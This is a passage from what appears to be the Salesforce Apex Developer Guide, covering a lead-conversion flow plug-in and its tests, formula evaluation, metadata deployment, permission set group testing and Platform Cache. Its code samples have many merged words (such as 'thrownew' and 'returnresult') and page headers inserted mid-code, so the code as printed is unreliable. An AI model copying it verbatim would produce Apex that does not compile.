'AccountID',
Process.PluginDescribeResult.ParameterType.STRING,
false),
// ContactID (optional)
new Process.PluginDescribeResult.InputParameter(
'ContactID',
Process.PluginDescribeResult.ParameterType.STRING,
false),
// Statusto use onceconverted
new Process.PluginDescribeResult.InputParameter(
'ConvertedStatus',
Process.PluginDescribeResult.ParameterType.STRING,
true),
new Process.PluginDescribeResult.InputParameter(
'OpportunityName',
Process.PluginDescribeResult.ParameterType.STRING,
484
Using Salesforce Features with ApexApex Developer Guide

false),
new Process.PluginDescribeResult.InputParameter(
'OverwriteLeadSource',
Process.PluginDescribeResult.ParameterType.BOOLEAN,
false),
new Process.PluginDescribeResult.InputParameter(
'CreateOpportunity',
Process.PluginDescribeResult.ParameterType.BOOLEAN,
false),
new Process.PluginDescribeResult.InputParameter(
'SendEmailToOwner',
Process.PluginDescribeResult.ParameterType.BOOLEAN,
false)
};
// Createa listthatstoresoutputparameterssent
// to the flow.
result.outputParameters= new List<
Process.PluginDescribeResult.OutputParameter>{
// AccountID of the convertedlead
new Process.PluginDescribeResult.OutputParameter(
'AccountID',
Process.PluginDescribeResult.ParameterType.STRING),
// ContactID of the convertedlead
new Process.PluginDescribeResult.OutputParameter(
'ContactID',
Process.PluginDescribeResult.ParameterType.STRING),
// OpportunityID of the convertedlead
new Process.PluginDescribeResult.OutputParameter(
'OpportunityID',
Process.PluginDescribeResult.ParameterType.STRING)
};
returnresult;
}
/**
* Implementationof the LeadConvertplug-in.
* Convertsa givenleadwithseveraloptions:
* leadID- ID of the leadto convert
* contactID-
* accountID- ID of the Accountto attachthe converted
*  Lead/Contact/Opportunityto.
* convertedStatus-
* overWriteLeadSource-
* createOpportunity- trueif you wantto createa new
*  Opportunityuponconversion
* opportunityName- Nameof the new Opportunity.
* sendEmailtoOwner- trueif you are changingownersupon
*  conversionand wantto notifythe new Opportunityowner.
*
* returns:a Map withthe followingoutput:
* AccountID- ID of the Accountcreatedor attached
*  to uponconversion.
485
Using Salesforce Features with ApexApex Developer Guide

* ContactID- ID of the Contactcreatedor attached
*  to uponconversion.
* OpportunityID- ID of the Opportunitycreated
*  uponconversion.
*/
publicMap<String,String> convertLead(
StringleadID,
StringcontactID,
StringaccountID,
StringconvertedStatus,
BooleanoverWriteLeadSource,
BooleancreateOpportunity,
StringopportunityName,
BooleansendEmailToOwner
) {
Map<String,String> result= new Map<String,String>();
if (leadId== null) thrownew ConvertLeadPluginException(
'LeadId cannotbe null');
// checkfor multipleleadswiththe sameID
Lead[]leads= [SelectId, FirstName,LastName,Company
FromLeadwhereId = :leadID];
if (leads.size()> 0) {
Leadl = leads[0];
// CheckAccount= true,checkContact= false
if (accountID== null&& l.Company!= null) {
Account[]accounts= [SelectId, NameFROMAccount
whereName= :l.CompanyLIMIT1];
if (accounts.size()> 0) {
accountId= accounts[0].id;
}
}
// Performthe leadconversion.
Database.LeadConvertlc = new Database.LeadConvert();
lc.setLeadId(leadID);
lc.setOverwriteLeadSource(overWriteLeadSource);
lc.setDoNotCreateOpportunity(!createOpportunity);
lc.setConvertedStatus(convertedStatus);
if (sendEmailToOwner!= null) lc.setSendNotificationEmail(
sendEmailToOwner);
if (accountId!= null&& accountId.length()> 0)
lc.setAccountId(accountId);
if (contactId!= null&& contactId.length()> 0)
lc.setContactId(contactId);
if (createOpportunity){
lc.setOpportunityName(opportunityName);
}
Database.LeadConvertResultlcr = Database.convertLead(
lc, true);
if (lcr.isSuccess()){
result.put('AccountID', lcr.getAccountId());
486
Using Salesforce Features with ApexApex Developer Guide

result.put('ContactID', lcr.getContactId());
if (createOpportunity){
result.put('OpportunityID',
lcr.getOpportunityId());
}
} else{
Stringerror= lcr.getErrors()[0].getMessage();
thrownew ConvertLeadPluginException(error);
}
} else{
thrownew ConvertLeadPluginException(
'No leadsfoundwithId : "' + leadId+ '"');
}
returnresult;
}
// Utilityexceptionclass
classConvertLeadPluginExceptionextendsException{}
}
// Testclassfor the leadconvertApexplug-in.
@isTest
privateclassVWFConvertLeadTest{
statictestMethodvoidbasicTest(){
// Createtestlead
LeadtestLead= new Lead(
Company='TestLead',FirstName='John',LastName='Doe');
inserttestLead;
LeadStatusconvertStatus=
[SelectId, MasterLabelfromLeadStatus
whereIsConverted=truelimit1];
// Createtestconversion
VWFConvertLeadaLeadPlugin= new VWFConvertLead();
Map<String,Object> inputParams= new Map<String,Object>();
Map<String,Object> outputParams= new Map<String,Object>();
inputParams.put('LeadID',testLead.ID);
inputParams.put('ConvertedStatus',
convertStatus.MasterLabel);
Process.PluginRequestrequest= new
Process.PluginRequest(inputParams);
Process.PluginResultresult;
result= aLeadPlugin.invoke(request);
LeadaLead= [selectname,id, isConverted
fromLeadwhereid = :testLead.ID];
System.Assert(aLead.isConverted);
}
/*
487
Using Salesforce Features with ApexApex Developer Guide

* Thistestsleadconversionwith
* the AccountID specified.
*/
statictestMethodvoidbasicTestwithAccount(){
// Createtestlead
LeadtestLead= new Lead(
Company='TestLead',FirstName='John',LastName='Doe');
inserttestLead;
AccounttestAccount= new Account(name='TestAccount');
inserttestAccount;
// System.debug('ACCOUNTBEFORE'+ testAccount.ID);
LeadStatusconvertStatus= [SelectId, MasterLabel
fromLeadStatuswhereIsConverted=truelimit1];
// Createtestconversion
VWFConvertLeadaLeadPlugin= new VWFConvertLead();
Map<String,Object> inputParams= new Map<String,Object>();
Map<String,Object> outputParams= new Map<String,Object>();
inputParams.put('LeadID',testLead.ID);
inputParams.put('AccountID',testAccount.ID);
inputParams.put('ConvertedStatus',
convertStatus.MasterLabel);
Process.PluginRequestrequest= new
Process.PluginRequest(inputParams);
Process.PluginResultresult;
result= aLeadPlugin.invoke(request);
LeadaLead=
[selectname,id, isConverted,convertedAccountID
fromLeadwhereid = :testLead.ID];
System.Assert(aLead.isConverted);
//System.debug('ACCOUNTAFTER'+ aLead.convertedAccountID);
System.AssertEquals(testAccount.ID, aLead.convertedAccountID);
}
/*
* Thistestsleadconversionwiththe AccountID specified.
*/
statictestMethodvoidbasicTestwithAccounts(){
// Createtestlead
LeadtestLead= new Lead(
Company='TestLead',FirstName='John',LastName='Doe');
inserttestLead;
AccounttestAccount1= new Account(name='TestLead');
inserttestAccount1;
AccounttestAccount2= new Account(name='TestLead');
488
Using Salesforce Features with ApexApex Developer Guide

inserttestAccount2;
// System.debug('ACCOUNTBEFORE'+ testAccount.ID);
LeadStatusconvertStatus= [SelectId, MasterLabel
fromLeadStatuswhereIsConverted=truelimit1];
// Createtestconversion
VWFConvertLeadaLeadPlugin= new VWFConvertLead();
Map<String,Object> inputParams= new Map<String,Object>();
Map<String,Object> outputParams= new Map<String,Object>();
inputParams.put('LeadID',testLead.ID);
inputParams.put('ConvertedStatus',
convertStatus.MasterLabel);
Process.PluginRequestrequest= new
Process.PluginRequest(inputParams);
Process.PluginResultresult;
result= aLeadPlugin.invoke(request);
LeadaLead=
[selectname,id, isConverted,convertedAccountID
fromLeadwhereid = :testLead.ID];
System.Assert(aLead.isConverted);
}
/*
* -ve Test
*/
statictestMethodvoiderrorTest(){
// Createtestlead
// LeadtestLead= new Lead(Company='TestLead',
//FirstName='John',LastName='Doe');
LeadStatusconvertStatus= [SelectId, MasterLabel
fromLeadStatuswhereIsConverted=truelimit1];
// Createtestconversion
VWFConvertLeadaLeadPlugin= new VWFConvertLead();
Map<String,Object> inputParams= new Map<String,Object>();
Map<String,Object> outputParams= new Map<String,Object>();
inputParams.put('LeadID','00Q7XXXXxxxxxxx');
inputParams.put('ConvertedStatus',convertStatus.MasterLabel);
Process.PluginRequestrequest= new
Process.PluginRequest(inputParams);
Process.PluginResultresult;
try {
result= aLeadPlugin.invoke(request);
}
catch(Exceptione) {
System.debug('EXCEPTION'+ e);
489
Using Salesforce Features with ApexApex Developer Guide

System.AssertEquals(1,1);
}
}
/*
* Thisteststhe describe()method
*/
statictestMethodvoiddescribeTest(){
VWFConvertLeadaLeadPlugin=
new VWFConvertLead();
Process.PluginDescribeResultresult=
aLeadPlugin.describe();
System.AssertEquals(
result.inputParameters.size(),8);
System.AssertEquals(
result.OutputParameters.size(),3);
}
}
Formula Evaluation in Apex
Formula evaluation in Apex helps avoid unnecessary DML statements to recalculate formula field values and evaluate dynamic formula
expressions. Dynamic formulas in Apex support SObjects and Apex objects as context objects. The context type that corresponds to the
Apex class used in the FormulaBuilder.withType() method must be a global, user-defined Apex class. Any fields, properties,
or methods that the formula references must also be global.
Note:  If formula fields on the input SObjects require a round-trip request to the database, use the
Formula.recalculateFormulas() method.
Formulas in Apex support these features.
•
Reference Apex types in formula fields. The values contained in individual components of such Apex types are accessed and evaluated
by the formula. Address, Location, URL, and UUID System types are supported.
•
Reference standard lookups and custom lookups in formula fields.
•
Access polymorphic relationship fields.
•
Access the return value from the toString() method in formula fields.
Formula evaluation in Apex is bound by the formula field character limit, but not the compile size limit. A formula can contain up to
3,900 characters including spaces, return characters, and comments.
Formula functions that are available to use in Apex are ones that can be used in validation rules. For details, see Formula Operators and
Functions by Context.
SEE ALSO:
Apex Reference Guide: FormulaEval Namespace
490
Using Salesforce Features with ApexApex Developer Guide

Metadata
Salesforce uses metadata types and components to represent org configuration and customization. Metadata is used for org settings
that admins control, or configuration information applied by installed apps and packages.
Use the classes in the Metadata namespace to access metadata from within Apex code for tasks that include:
•
Customizing app installs or upgrades—During or after an install (or upgrade), your app can create or update metadata to let users
configure your app.
•
Customizing apps after installation—After your app is installed, you can use metadata in Apex to let admins configure your app
using the UI that your app provides rather than having admins manually use the standard Salesforce setup UI.
•
Securely accessing protected metadata—Update metadata that your app uses internally without exposing these types and components
to your users.
•
Creating custom configuration tools—Use metadata in Apex to provide custom tools for admins to customize apps and packages.
Metadata access in Apex is available for Apex classes using API version 40.0 and later.
For more information on metadata types and components, see the Metadata API Developer Guide and Custom Metadata Types.
Retrieving and Deploying Metadata
Retrieve and deploy metadata by using the Metadata.Operations class.
Supported Metadata Types
Apex supports a subset of metadata types and components.
Security Considerations
Be aware of security considerations when using Apex to access metadata.
Testing Metadata Deployments
Apex code that accesses metadata must be properly tested.
SEE ALSO:
Apex Reference Guide: Metadata Namespace
Retrieving and Deploying Metadata
Retrieve and deploy metadata by using the Metadata.Operations class.
Use the Metadata.Operations.retrieve() method to synchronously retrieve metadata from the current org. Provide a list
of metadata component names that you want to retrieve. Salesforce returns a list of matching component data, represented by component
classes that derive from Metadata.Metadata.
Use the Metadata.Operations.enqueueDeployment() method to asynchronously deploy metadata to the current org.
Deployment is queued for asynchronous processing. When deploying metadata, you can create and update components but not delete
them. There are limitations on which components that apps and packages can deploy and which types of apps and packages can deploy
to which types of orgs. There are also service protection limitations on how many deployments that you can enqueue at one time from
Apex. For more information, see Security Considerations.
Use the full name of the metadata component when retrieving and deploying metadata. The full name can include the namespace,
metadata type, and component name. If you’re updating components in a namespace, you must qualify the namespace for the component
in the full name. For example, the full name for a custom metadata MDType1__mdt component named Component1 that is contained
in the myPackage namespace is myPackage__MDType1__mdt.myPackage__Component1. For more information on the metadata
component full name syntax, see Metadata base type in the Metadata API Developer Guide.
491
Using Salesforce Features with ApexApex Developer Guide

You can retrieve and deploy metadata in post install scripts. In uninstall scripts, you can only retrieve, not deploy, metadata from Apex
code.
See Metadata.Operations for code examples for retrieving and deploying metadata.
Supported Metadata Types
Apex supports a subset of metadata types and components.
Metadata access in Apex is limited to types and components that support the use cases described in Metadata. Apps and packages can
use the metadata feature in Apex to retrieve and deploy the following metadata types and components:
•
Records of custom metadata types
•
Layouts
Security Considerations
Be aware of security considerations when using Apex to access metadata.
Generally, Apex classes installed in the subscriber org can access any public, supported metadata type or component in the subscriber
org. Protected metadata, such as a custom metadata type that’s been marked protected, can only be accessed by Apex classes in the
same namespace as the protected metadata.
Additionally, for managed packages, if the managed package isn’t approved by Salesforce via security review, Apex classes in the package
can’t access public or protected metadata unless the Deploy Metadata from Non-Certified Package Versions via Apex org preference
is enabled. This preference, located under Setup > Apex Settings, must be enabled if admins or developers are installing managed
packages that haven’t passed security review for app testing or pilot purposes.
For deployments, because Metadata.Operations.enqueueDeployment() uses asynchronous Apex, queued deployment
jobs and deployment callbacks are counted as asynchronous jobs in the current org. Queued deployment jobs and callbacks are subject
to governor limits. See Lightning Platform Apex Limits. To preserve service function, we limit the number of Metadata API deployments
originating from Apex that can be enqueued at a time. See Limit on Enqueued Deployments from Apex.
Apps that access metadata via Apex must notify users that the app can retrieve or deploy metadata in the subscriber org. For installs
that access metadata, notify users in the description of your package. You can write your own notice, or use this sample:
Thispackagecan accessand changemetadataoutsideits namespacein the Salesforce
org whereit’sinstalled.
Salesforce verifies the notice during the security review. For more information, see the ISVforce Guide.
Testing Metadata Deployments
Apex code that accesses metadata must be properly tested.
To provide Apex test coverage for metadata deployments, write tests that verify both the set up of the deployment request and handling
of the deployment results.
Tests for deployment request code verify the metadata components and component values that get created and assert that the
DeployContainer contains exactly what needs to be deployed.
Tests for deployment result code verify that your DeployCallback handles expected and unexpected results. Your
DeployCallback is normally called by Salesforce as part of the asynchronous deployment process. Therefore, to test your callback
outside of the deployment process, create tests that use your callback class directly. You also must create test DeployResults and
DeployCallbackContext instances to test your DeployCallback.handleResults() method.
492
Using Salesforce Features with ApexApex Developer Guide

When creating a test instance of DeployCallbackContext, subclass DeployCallbackContext and provide your own
implementation of getCallbackJobId().
// DeployCallbackContextsubclassfor testingthatreturnsmyJobId
publicclassTestingDeployCallbackContextextendsMetadata.DeployCallbackContext{
privateId myJobId= '000000000000000000'; // replacevaluewitha job ID thatyou can
use for testing
publicoverrideId getCallbackJobId(){
returnmyJobId;
}
}
Permission Set Groups
To provide Apex test coverage for permission set groups, write tests using the calculatePermissionSetGroup() method
in the System.Test class.
The calculatePermissionSetGroup() method forces an immediate calculation of aggregate permissions for a specified
permission set group. As the forced calculation counts against Apex CPU limits, and can require complex data setup, it’s a best practice
to minimize the number of times you perform this operation. Recalculating complex permission set groups with a large number of
included permission sets or overall enabled permissions can cause Apex test failures because Apex CPU limits are exceeded. Apex CPU
limits can also be exceeded if the included permission sets in the permission set group aren’t licensed and the permission set group is
assigned to many users.
Set this test to run once in a Test setup method, then reuse the data in subsequent tests.
@isTestpublicclassPSGTest{
@isTeststaticvoidtestPSG(){
// get the PSG by name(mayhavebeenmodifiedin deployment)
PermissionSetGrouppsg = [selectId, StatusfromPermissionSetGroupwhere
DeveloperName='MyPSG'];
// forcecalculationof the PSG if it is not alreadyUpdated
if (psg.Status!= 'Updated'){
Test.calculatePermissionSetGroup(psg.Id);
}
// assignPSG to currentuser(thisfailsif PSG is Outdated)
insertnew PermissionSetAssignment(PermissionSetGroupId= psg.Id,AssigneeId=
UserInfo.getUserId());
// additionalteststo validatepermissionsgrantedby PSG
}
}
SEE ALSO:
Salesforce Help: Permission Set Groups
Apex Reference Guide: Test Class
493
Using Salesforce Features with ApexApex Developer Guide

Platform Cache
The Lightning Platform Cache layer provides faster performance and better reliability when caching Salesforce session and org data.
Specify what to cache and for how long without using custom objects and settings or overloading a Visualforce view state. Platform
Cache improves performance by distributing cache space so that some applications or operations don’t steal capacity from others.
Because Apex runs in a multi-tenant environment with cached data living alongside internally cached data, caching involves minimal
disruption to core Salesforce processes.
Platform Cache Features
The Platform Cache API lets you store and retrieve data that’s tied to Salesforce sessions or shared across your org. Put, retrieve, or
remove cache values by using the Session, Org, SessionPartition, and OrgPartition classes in the Cache
namespace. Use the Platform Cache Partition tool in Setup to create or remove org partitions and allocate their cache capacities to
balance performance across apps.
Platform Cache Considerations
Review these considerations when working with Platform Cache.
Platform Cache Limits
These limits apply when using Platform Cache.
Platform Cache Partitions
Use Platform Cache partitions to improve the performance of your applications. Partitions allow you to distribute cache space in the
way that works best for your applications. Caching data to designated partitions ensures that it’s not overwritten by other applications
or less-critical data.
Platform Cache Internals
Platform Cache uses local cache and a least recently used (LRU) algorithm to improve performance.
Store and Retrieve Values from the Session Cache
Use the Cache.Session and Cache.SessionPartition classes to manage values in the session cache. To manage
values in any partition, use the methods in the Cache.Session class. If you’re managing cache values in one partition, use the
Cache.SessionPartition methods instead.
Store and Retrieve Values from the Org Cache
Use the Cache.Org and Cache.OrgPartition classes to manage values in the org cache. To manage values in any partition,
use the methods in the Cache.Org class. If you’re managing cache values in one partition, use the Cache.OrgPartition
methods instead.
Use a Visualforce Global Variable for the Platform Cache
You can access cached values stored in the session or org cache from a Visualforce page with global variables.
Safely Cache Values with the CacheBuilder Interface
A Platform Cache best practice is to ensure that your Apex code handles cache misses by testing for cache requests that return null.
You can write this code yourself. Or, you can use the Cache.CacheBuilder interface, which makes it easy to safely store and
retrieve values to a session or org cache.
Platform Cache Best Practices
Platform Cache can greatly improve performance in your applications. However, it’s important to follow these guidelines to get the
best cache performance. In general, it’s more efficient to cache a few large items than to cache many small items separately. Also
be mindful of cache limits to prevent unexpected cache evictions.
494
Using Salesforce Features with ApexApex Developer Guide

Platform Cache Features
The Platform Cache API lets you store and retrieve data that’s tied to Salesforce sessions or shared across your org. Put, retrieve, or remove
cache values by using the Session, Org, SessionPartition, and OrgPartition classes in the Cache namespace. Use
the Platform Cache Partition tool in Setup to create or remove org partitions and allocate their cache capacities to balance performance
across apps.
There are two types of cache:
•
Session cache—Stores data for individual user sessions. For example, in an app that finds customers within specified territories,
the calculations that run while users browse different locations on a map are reused.
Session cache lives alongside a user session. The maximum life of a session is eight hours. Session cache expires when its specified
time-to-live (ttlsecs value) is reached or when the session expires after eight hours, whichever comes first.
•
Org cache—Stores data that any user in an org reuses. For example, the contents of navigation bars that dynamically display menu
items based on user profile are reused.
Unlike session cache, org cache is accessible across sessions, requests, and org users and profiles. Org cache expires when its specified
time-to-live (ttlsecs value) is reached.
Additionally, Salesforce provides 3 MB of free Platform Cache capacity for security-reviewed managed packages through a capacity type
called Provider Free capacity. You can allocate capacities to session cache and org cache from the Provider Free capacity.
The best data to cache is:
•
Reused throughout a session
•
Static (not rapidly changing)
•
Otherwise expensive to retrieve
For both session and org caches, you can construct calls so that cached data in one namespace isn’t overwritten by similar data in
another. Optionally use the Cache.Visibility enumeration to specify whether Apex code can access cached data in a namespace
outside of the invoking namespace.
Each cache operation depends on the Apex transaction within which it runs. If the entire transaction fails, all cache operations in that
transaction are rolled back.
Try Platform Cache
To test performance improvements by using Platform Cache in your own org, you can request trial cache for your production org.
Enterprise, Unlimited, and Performance editions come with some cache, but adding more cache often provides greater performance.
When your trial request is approved, you can allocate capacity to partitions and experiment with using the cache for different scenarios.
Testing the cache on a trial basis lets you make an informed decision about whether to purchase cache.
For more information about trial cache, see “Request a Platform Cache Trial” in Salesforce Help.
You can request additional cache space to improve the performance of your application. For more information about requesting additional
cache, see "Request Additional Platform Cache" in Salesforce Help.
For more information about Provider Free capacity cache, see “Set Up a Platform Cache partition using Provider Free Capacity” in Salesforce
Help.
495
Using Salesforce Features with ApexApex Developer Guide

Note:  Platform Cache isn’t supported in Professional Edition.
SEE ALSO:
Apex Reference Guide: Session Class
Apex Reference Guide: Org Class
Apex Reference Guide: Partition Class
Apex Reference Guide: OrgPartition Class
Apex Reference Guide: SessionPartition Class
Apex Reference Guide: CacheBuilder Interface
Platform Cache Considerations
Review these considerations when working with Platform Cache.
•
Cache isn’t persisted. There’s no guarantee against data loss.
•
Some or all cache is invalidated when you modify an Apex class in your org.
•
Data in the cache isn’t encrypted.
•
Org cache supports concurrent reads and writes across multiple simultaneous Apex transactions. For example, a transaction updates
the key PetName with the value Fido. At the same time, another transaction updates the same key with the value Felix. Both
writes succeed, but one of the two values is chosen arbitrarily as the winner, and later transactions read that one value. However,
this arbitrary choice is per key rather than per transaction. For example, suppose one transaction writes PetType="Cat" and
PetName="Felix". Then, at the same moment, another transaction writes PetType="Dog" and PetName="Fido".
In this case, the PetType winning value could be from the first transaction, and the PetName winning value could be from the
second transaction. Subsequent get() calls on those keys would return PetType="Cat" and PetName="Fido".
•
Cache misses can happen. We recommend constructing your code to consider a case where previously cached items aren’t found.
Alternatively, use the CacheBuilder Interface, which checks for cache misses.
•
All platform cache statistical methods: getAvgGetSize(), getAvgGetTime(), getMaxGetSize(),
getMaxGetTime(), and getMissRate()report data starting from the time the cache server was restarted, and do not
include data prior to the restart.
•
Partitions must adhere to the limits within Salesforce.
•
The session cache can store values up to eight hours. The org cache can store values up to 48 hours.
•
For orgs that use Salesforce Flow:
–
When a process contains a scheduled action, make sure that later actions in the process don't invoke Apex code that stores or
retrieves values from the session cache. The session-cache restriction applies to Apex actions and to changes that the process
makes to the database that cause Apex triggers to fire.
–
When a flow contains a Pause element, make sure that later elements in the flow don't invoke Apex code that stores or retrieves
values from the session cache. The session-cache restriction applies to Apex actions and to changes that the flow makes to the
database that cause Apex triggers to fire.
Platform Cache Limits
These limits apply when using Platform Cache.
496
Using Salesforce Features with ApexApex Developer Guide

Platform Cache Limits
Key Size Limits
ValueLimit
50 charactersMaximum key size
Edition-specific Limits
This table shows the amount of Platform Cache available for different types of orgs. To purchase more cache, contact your Salesforce
representative.
Cache SizeEdition
10 MBEnterprise
30 MBUnlimited and Performance
0 MBAll others
Partition Size Limits
ValueLimit
1 MBMinimum partition size
Session Cache Limits
ValueLimit
100 KBMaximum size of a single cached item (for put() methods)
500 KBMaximum local cache size for a partition, per-request
1
300 seconds (5 minutes)Minimum developer-assigned time-to-live
28,800 seconds (8 hours)Maximum developer-assigned time-to-live
28,800 seconds (8 hours)Maximum session cache time-to-live
Org Cache Limits
ValueLimit
100 KBMaximum size of a single cached item (for put() methods)
1,000 KBMaximum local cache size for a partition, per-request
1
300 seconds (5 minutes)Minimum developer-assigned time-to-live
172,800 seconds (48 hours)Maximum developer-assigned time-to-live
497
Using Salesforce Features with ApexApex Developer Guide

ValueLimit
86,400 seconds (24 hours)Default org cache time-to-live
1
 Local cache is the application server’s in-memory container that the client interacts with during a request.
Platform Cache Partitions
Use Platform Cache partitions to improve the performance of your applications. Partitions allow you to distribute cache space in the way
that works best for your applications. Caching data to designated partitions ensures that it’s not overwritten by other applications or
less-critical data.
To use Platform Cache, first set up partitions using the Platform Cache Partition tool in Setup. Once you’ve set up partitions, you can add,
access, and remove data from them using the Platform Cache Apex API.
To access the Partition tool in Setup, enter PlatformCache in the QuickFind box, then select Platform Cache.
Use the Partition tool to:
•
Setup a Platform Cache partition with Provider Free capacity.
•
Request trial cache.
•
Create, edit, or delete cache partitions.
•
Allocate the session cache and org cache capacities of each partition to balance performance across apps.
•
View a snapshot of the org’s current cache capacity, breakdown, and partition allocations (in KB or MB).
•
View details about each partition.
•
Make any partition the default partition.
To use Platform Cache, create at least one partition. Each partition has one session cache and one org cache segment and you can
allocate separate capacity to each segment. Session cache can be used to store data for individual user sessions, and org cache is for
data that any users in an org can access. You can distribute your org’s cache space across any number of partitions. Session and org
cache allocations can be zero, or five or greater, and they must be whole numbers. The sum of all partition allocations, including the
default partition, equals the Platform Cache total allocation. The total allocated capacity of all cache segments must be less than or equal
to the org’s overall capacity.
You can define any partition as the default partition, but you can have only one default partition. When a partition has no allocation,
cache operations (such as get and put) are not invoked, and no error is returned.
When performing cache operations within the default partition, you can omit the partition name from the key.
After you set up partitions, you can use Apex code to perform cache operations on a partition. For example, use the
Cache.SessionPartition and Cache.OrgPartition classes to put, retrieve, or remove values on a specific partition’s
cache. Use Cache.Session and Cache.Org to get a partition or perform cache operations by using a fully qualified key.
Packaging Platform Cache Partitions
When packaging an application that uses Platform Cache, add any referenced partitions to your packages explicitly. Partitions aren’t
pulled into packages automatically, as other dependencies are. Partition validation occurs during run time, rather than compile time.
Therefore, if a partition is missing from a package, you don’t receive an error message at compile time.
498
Using Salesforce Features with ApexApex Developer Guide

Note:  If platform cache code is intended for a package, don’t use the default partition in the package. Instead, explicitly reference
and package a non-default partition. Any package containing the default partition can’t be deployed.
SEE ALSO:
Apex Reference Guide: Partition Class
Apex Reference Guide: OrgPartition Class
Apex Reference Guide: SessionPartition Class
Metadata API Developer’s Guide: Platform Cache Partition Type
Platform Cache Internals
Platform Cache uses local cache and a least recently used (LRU) algorithm to improve performance.
Local Cache
Platform Cache uses local cache to improve performance, ensure efficient use of the network, and support atomic transactions. Local
cache is the application server’s in-memory container that the client interacts with during a request. Cache operations don’t interact
with the caching layer directly, but instead interact with local cache.
For session cache, all cached items are loaded into local cache upon first request. All subsequent interactions use the local cache. Similarly,
an org cache get operation retrieves a value from the caching layer and stores it in the local cache. Subsequent requests for this value
are retrieved from the local cache. All mutable operations, such as put and remove, are also performed against the local cache. Upon
successful completion of the request, mutable operations are committed.
Note:  Local cache doesn’t support concurrent operations. Mutable operations, such as put and remove, are performed against
the local cache and are only committed when the entire Apex request is successful. Therefore, other simultaneous requests don’t
see the results of the mutable operations.
Atomic Transactions
Each cache operation depends on the Apex request that it runs in. If the entire request fails, all cache operations in that request are rolled
back. Behind the scenes, the use of local cache supports these atomic transactions.
Eviction Algorithm
When possible, Platform Cache uses an LRU algorithm to evict keys from the cache. When cache limits are reached, keys are evicted
until the cache is reduced to 100-percent capacity. If session cache is used, the system removes cache evenly from all existing session
cache instances. Local cache also uses an LRU algorithm. When the maximum local cache size for a partition is reached, the least recently
used items are evicted from the local cache.
SEE ALSO:
Platform Cache Limits
Store and Retrieve Values from the Session Cache
Use the Cache.Session and Cache.SessionPartition classes to manage values in the session cache. To manage values
in any partition, use the methods in the Cache.Session class. If you’re managing cache values in one partition, use the
Cache.SessionPartition methods instead.
499
Using Salesforce Features with ApexApex Developer Guide

Cache.Session Methods
To store a value in the session cache, call the Cache.Session.put() method and supply a key and value. The key name is in the
format namespace.partition.key. For example, for namespace ns1, partition partition1, and key orderDate, the fully qualified
key name is ns1.partition1.orderDate.
This example stores a DateTime cache value with the key orderDate. Next, the snippet checks if the orderDate key is in the
cache, and if so, retrieves the value from the cache.
// Add a valueto the cache
DateTimedt = DateTime.parse('06/16/201511:46AM');
Cache.Session.put('ns1.partition1.orderDate', dt);
if (Cache.Session.contains('ns1.partition1.orderDate')) {
DateTimecachedDt= (DateTime)Cache.Session.get('ns1.partition1.orderDate');
}
To refer to the default partition and the namespace of the invoking class, omit the namespace.partition prefix and specify the
key name.
Cache.Session.put('orderDate', dt);
if (Cache.Session.contains('orderDate')) {
DateTimecachedDt= (DateTime)Cache.Session.get('orderDate');
}
The local prefix refers to the namespace of the current org where the code is running, regardless of whether the org has a namespace
defined. If the org has a namespace defined as ns1, the following two statements are equivalent.
Cache.Session.put('local.myPartition.orderDate', dt);
Cache.Session.put('ns1.myPartition.orderDate', dt);
Note:  The local prefix in an installed managed package refers to the namespace of the subscriber org and not the package’s
namespace. The cache put calls are not allowed in a partition that the invoking class doesn’t own.
The put() method has multiple versions (or overloads), and each version takes different parameters. For example, to specify that your
cached value can’t be overwritten by another namespace, set the last parameter of this method to true. The following example also
sets the lifetime of the cached value (3600 seconds or 1 hour) and makes the value available to any namespace.
// Add a valueto the cachewithoptions
Cache.Session.put('ns1.partition1.totalSum', '500', 3600,Cache.Visibility.ALL,true);
To retrieve a cached value from the session cache, call the Cache.Session.get() method. Because Cache.Session.get()
returns an object, we recommend that you cast the returned value to a specific type.
// Get a cachedvalue
Objectobj = Cache.Session.get('ns1.partition1.orderDate');
// Castreturnvalueto a specificdatatype
DateTimedt2 = (DateTime)obj;
Cache.SessionPartition Methods
If you’re managing cache values in one partition, use the Cache.SessionPartition methods instead. After the partition object
is obtained, the process of adding and retrieving cache values is similar to using the Cache.Session methods. The
Cache.SessionPartition methods are easier to use because you specify only the key name without the namespace and
partition prefix.
First, get the session partition and specify the desired partition. The partition name includes the namespace prefix:
namespace.partition. You can manage the cached values in that partition by adding and retrieving cache values on the obtained
500
Using Salesforce Features with ApexApex Developer Guide

partition object. The following example obtains the partition named myPartition in the myNs namespace. Next, if the cache contains a
value with the key BookTitle, this cache value is retrieved. A new value is added with key orderDate and today’s date.
// Get partition
Cache.SessionPartitionsessionPart= Cache.Session.getPartition('myNs.myPartition');
// Retrievecachevaluefromthe partition
if (sessionPart.contains('BookTitle')) {
StringcachedTitle= (String)sessionPart.get('BookTitle');
}
// Add cachevalueto the partition
sessionPart.put('OrderDate', Date.today());
This example calls the get method on a partition in one expression without assigning the partition instance to a variable.
// Or use dot notationto callpartitionmethods
StringcachedAuthor=
(String)Cache.Session.getPartition('myNs.myPartition').get('BookAuthor');
SEE ALSO:
Apex Reference Guide: Session Class
Apex Reference Guide: SessionPartition Class
Store and Retrieve Values from the Org Cache
Use the Cache.Org and Cache.OrgPartition classes to manage values in the org cache. To manage values in any partition,
use the methods in the Cache.Org class. If you’re managing cache values in one partition, use the Cache.OrgPartition
methods instead.
Cache.Org Methods
To store a value in the org cache, call the Cache.Org.put() method and supply a key and value. The key name is in the format
namespace.partition.key. For example, for namespace ns1, partition partition1, and key orderDate, the fully qualified key
name is ns1.partition1.orderDate.
This example stores a DateTime cache value with the key orderDate. Next, the snippet checks if the orderDate key is in the
cache, and if so, retrieves the value from the cache.
// Add a valueto the cache
DateTimedt = DateTime.parse('06/16/201511:46AM');
Cache.Org.put('ns1.partition1.orderDate', dt);
if (Cache.Org.contains('ns1.partition1.orderDate')) {
DateTimecachedDt= (DateTime)Cache.Org.get('ns1.partition1.orderDate');
}
To refer to the default partition and the namespace of the invoking class, omit the namespace.partition prefix and specify the
key name.
Cache.Org.put('orderDate', dt);
if (Cache.Org.contains('orderDate')) {
DateTimecachedDt= (DateTime)Cache.Org.get('orderDate');
}
501
Using Salesforce Features with ApexApex Developer Guide

The local prefix refers to the namespace of the current org where the code is running. The local prefix refers to the namespace
of the current org where the code is running, regardless of whether the org has a namespace defined. If the org has a namespace defined
as ns1, the following two statements are equivalent.
Cache.Org.put('local.myPartition.orderDate', dt);
Cache.Org.put('ns1.myPartition.orderDate', dt);
Note:  The local prefix in an installed managed package refers to the namespace of the subscriber org and not the package’s
